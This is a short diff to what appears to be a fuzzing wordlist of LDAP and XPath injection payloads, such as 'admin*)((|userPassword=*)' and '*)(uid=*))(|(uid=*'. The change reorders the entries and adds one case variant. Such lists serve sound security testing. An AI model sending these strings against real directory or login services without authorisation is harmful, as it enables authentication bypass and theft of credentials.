@@ -10,18 +10,19 @@
 &
 (
 )
+*()|%26'
+*()|&'
 *(|(mail=*))
 *(|(objectclass=*))
+*)(uid=*))(|(uid=*
 */*
 *|
 /
 //
 //*
 @*
-x' or name()='username' or 'x'='y
 |
-*()|&'
 admin*
 admin*)((|userpassword=*)
-*)(uid=*))(|(uid=*
-*()|%26'
+admin*)((|userPassword=*)
+x' or name()='username' or 'x'='y
